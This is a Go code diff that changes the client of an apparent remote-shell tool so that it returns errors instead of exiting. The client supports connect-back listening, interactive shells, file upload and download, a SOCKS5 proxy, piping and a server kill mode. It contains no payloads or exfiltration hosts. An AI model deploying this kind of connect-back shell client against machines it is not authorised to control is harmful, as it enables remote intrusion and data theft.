@@ -41,7 +41,7 @@ type PipeArgs struct {
 	TargetAddr string
 }
 
-func Run(secret []byte, host string, port int, mode uint8, arg any) {
+func Run(secret []byte, host string, port int, mode uint8, arg any) error {
 	// apply kdf
 	secret = utils.KDF(secret)
 
@@ -54,7 +54,7 @@ func Run(secret []byte, host string, port int, mode uint8, arg any) {
 	var connectBackListener *pel.PktEncLayerListener
 	var err error
 
-	waitForConnection := func() utils.DuplexStreamEx {
+	waitForConnection := func() (utils.DuplexStreamEx, error) {
 		// avoid calling this concurrently in connect-back mode
 		// because multiple goroutines trying to listen on same port = error
 		// a lock may fix this lol
@@ -63,8 +63,7 @@ func Run(secret []byte, host string, port int, mode uint8, arg any) {
 			for {
 				connectBackListener, err = pel.Listen(addr, secret, false)
 				if err != nil {
-					log.Println(err)
-					os.Exit(1)
+					return nil, err
 				}
 				log.Print("Waiting for the server to connect...")
 				stream, err := connectBackListener.Accept()
@@ -74,43 +73,56 @@ func Run(secret []byte, host string, port int, mode uint8, arg any) {
 					continue
 				}
 				log.Println("connected.")
-				stream.Write([]byte{mode})
-				return stream
+				if _, err := stream.Write([]byte{mode}); err != nil {
+					stream.Close()
+					return nil, err
+				}
+				return stream, nil
 			}
 		} else {
 			addr := fmt.Sprintf("%s:%d", host, port)
 			stream, err := pel.Dial(addr, secret, true)
 			if err != nil {
-				log.Println(err)
-				os.Exit(1)
+				return nil, err
 			}
-			stream.Write([]byte{mode})
-			return stream
+			if _, err := stream.Write([]byte{mode}); err != nil {
+				stream.Close()
+				return nil, err
+			}
+			return stream, nil
 		}
 	}
 
 	switch mode {
 	case constants.Kill:
-		stream := waitForConnection()
+		stream, err := waitForConnection()
+		if err != nil {
+			return err
+		}
 		stream.Close()
 		log.Println("Server killed")
+		return nil
 	case constants.RunShell:
-		handleRunShell(waitForConnection, arg.(RunShellArgs))
+		return handleRunShell(waitForConnection, arg.(RunShellArgs))
 	case constants.GetFile:
-		handleGetFile(waitForConnection, arg.(GetFileArgs))
+		return handleGetFile(waitForConnection, arg.(GetFileArgs))
 	case constants.PutFile:
-		handlePutFile(waitForConnection, arg.(PutFileArgs))
+		return handlePutFile(waitForConnection, arg.(PutFileArgs))
 	case constants.SOCKS5:
-		handleSocks5(waitForConnection, arg.(Socks5Args))
+		return handleSocks5(waitForConnection, arg.(Socks5Args))
 	case constants.Pipe:
-		handlePipe(waitForConnection, arg.(PipeArgs))
+		return handlePipe(waitForConnection, arg.(PipeArgs))
 	case constants.RunShellNoTTY:
-		handleRunShellNoTTY(waitForConnection, arg.(RunShellArgs))
+		return handleRunShellNoTTY(waitForConnection, arg.(RunShellArgs))
 	}
+	return fmt.Errorf("unknown client mode: %d", mode)
 }
 
-func handleGetFile(waitForConnection func() utils.DuplexStreamEx, arg GetFileArgs) {
-	stream := waitForConnection()
+func handleGetFile(waitForConnection func() (utils.DuplexStreamEx, error), arg GetFileArgs) error {
+	stream, err := waitForConnection()
+	if err != nil {
+		return err
+	}
 	defer stream.Close()
 	buffer := make([]byte, constants.MaxMessagesize)
 
@@ -146,28 +158,29 @@ func handleGetFile(waitForConnection func() utils.DuplexStreamEx, arg GetFileArg
 
 		f, err := os.OpenFile(destination, os.O_CREATE|os.O_RDWR|os.O_TRUNC, 0644)
 		if err != nil {
-			log.Println(err)
-			return
+			return err
 		}
 		defer f.Close()
 
 		writer = io.MultiWriter(f, bar)
 	}
 
-	err := utils.WriteVarLength(stream, []byte(arg.Src))
+	err = utils.WriteVarLength(stream, []byte(arg.Src))
 	if err != nil {
-		log.Println(err)
-		return
+		return err
 	}
 	_, err = utils.CopyBuffer(writer, stream, buffer)
 	if err != nil {
-		log.Println(err)
-		os.Exit(1)
+		return err
 	}
+	return nil
 }
 
-func handlePutFile(waitForConnection func() utils.DuplexStreamEx, arg PutFileArgs) {
-	stream := waitForConnection()
+func handlePutFile(waitForConnection func() (utils.DuplexStreamEx, error), arg PutFileArgs) error {
+	stream, err := waitForConnection()
+	if err != nil {
+		return err
+	}
 	defer stream.Close()
 
 	var reader io.Reader
@@ -182,30 +195,26 @@ func handlePutFile(waitForConnection func() utils.DuplexStreamEx, arg PutFileArg
 	} else {
 		f, err := os.Open(arg.Src)
 		if err != nil {
-			log.Println(err)
-			os.Exit(1)
+			return err
 		}
 		defer f.Close()
 		reader = f
 
 		fi, err := f.Stat()
 		if err != nil {
-			log.Println(err)
-			os.Exit(1)
+			return err
 		}
 		fsize = fi.Size()
 		basename = filepath.Base(arg.Src)
 	}
 
-	err := utils.WriteVarLength(stream, []byte(arg.Dst))
+	err = utils.WriteVarLength(stream, []byte(arg.Dst))
 	if err != nil {
-		log.Println(err)
-		return
+		return err
 	}
 	err = utils.WriteVarLength(stream, []byte(basename))
 	if err != nil {
-		log.Println(err)
-		return
+		return err
 	}
 
 	bar := progressbar.NewOptions(int(fsize),
@@ -226,18 +235,20 @@ func handlePutFile(waitForConnection func() utils.DuplexStreamEx, arg PutFileArg
 
 	_, err = utils.CopyBuffer(writer, reader, make([]byte, constants.MaxMessagesize))
 	if err != nil {
-		log.Println(err)
-		os.Exit(1)
+		return err
 	}
+	return nil
 }
 
-func handleRunShell(waitForConnection func() utils.DuplexStreamEx, arg RunShellArgs) {
-	stream := waitForConnection()
+func handleRunShell(waitForConnection func() (utils.DuplexStreamEx, error), arg RunShellArgs) error {
+	stream, err := waitForConnection()
+	if err != nil {
+		return err
+	}
 	defer stream.Close()
 	oldState, err := terminal.MakeRaw(int(os.Stdin.Fd()))
 	if err != nil {
-		log.Println(err)
-		return
+		return err
 	}
 
 	defer func() {
@@ -251,7 +262,7 @@ func handleRunShell(waitForConnection func() utils.DuplexStreamEx, arg RunShellA
 	}
 	err = utils.WriteVarLength(stream, []byte(term))
 	if err != nil {
-		return
+		return err
 	}
 
 	// if stdout is not a tty it is likely a pipe to a file
@@ -268,35 +279,38 @@ func handleRunShell(waitForConnection func() utils.DuplexStreamEx, arg RunShellA
 	ws[3] = byte((ws_col) & 0xFF)
 	_, err = stream.Write(ws)
 	if err != nil {
-		return
+		return err
 	}
 
 	err = utils.WriteVarLength(stream, []byte(arg.Command))
 	if err != nil {
-		return
+		return err
 	}
 	utils.DuplexPipe(utils.DSEFromRW(os.Stdin, os.Stdout), stream, nil, nil)
+	return nil
 }
-func handleRunShellNoTTY(waitForConnection func() utils.DuplexStreamEx, arg RunShellArgs) {
-	stream := waitForConnection()
+func handleRunShellNoTTY(waitForConnection func() (utils.DuplexStreamEx, error), arg RunShellArgs) error {
+	stream, err := waitForConnection()
+	if err != nil {
+		return err
+	}
 	defer stream.Close()
 
-	err := utils.WriteVarLength(stream, []byte(arg.Command))
+	err = utils.WriteVarLength(stream, []byte(arg.Command))
 	if err != nil {
-		return
+		return err
 	}
 	utils.DuplexPipe(utils.DSEFromRW(os.Stdin, os.Stdout), stream, nil, nil)
+	return nil
 }
-func handleSocks5(waitForConnection func() utils.DuplexStreamEx, arg Socks5Args) {
+func handleSocks5(waitForConnection func() (utils.DuplexStreamEx, error), arg Socks5Args) error {
 	addr, err := net.ResolveTCPAddr("tcp", arg.Socks5Addr)
 	if err != nil {
-		log.Println(err)
-		os.Exit(1)
+		return err
 	}
 	l, err := net.ListenTCP("tcp", addr)
 	if err != nil {
-		log.Println(err)
-		os.Exit(1)
+		return err
 	}
 	log.Println("Socks5 proxy listening at", l.Addr())
 
@@ -314,7 +328,10 @@ func handleSocks5(waitForConnection func() utils.DuplexStreamEx, arg Socks5Args)
 			return session, nil
 		}
 
-		stream := waitForConnection()
+		stream, err := waitForConnection()
+		if err != nil {
+			return nil, err
+		}
 		config := yamux.DefaultConfig()
 		config.LogOutput = io.Discard
 		nextSession, err := yamux.Client(stream, config)
@@ -362,8 +379,15 @@ func handleSocks5(waitForConnection func() utils.DuplexStreamEx, arg Socks5Args)
 	}
 }
 
-func handlePipe(waitForConnection func() utils.DuplexStreamEx, arg PipeArgs) {
-	stream := waitForConnection()
-	utils.WriteVarLength(stream, []byte(arg.TargetAddr))
+func handlePipe(waitForConnection func() (utils.DuplexStreamEx, error), arg PipeArgs) error {
+	stream, err := waitForConnection()
+	if err != nil {
+		return err
+	}
+	if err := utils.WriteVarLength(stream, []byte(arg.TargetAddr)); err != nil {
+		stream.Close()
+		return err
+	}
 	utils.DuplexPipe(utils.DSEFromRW(os.Stdin, os.Stdout), stream, nil, nil)
+	return nil
 }
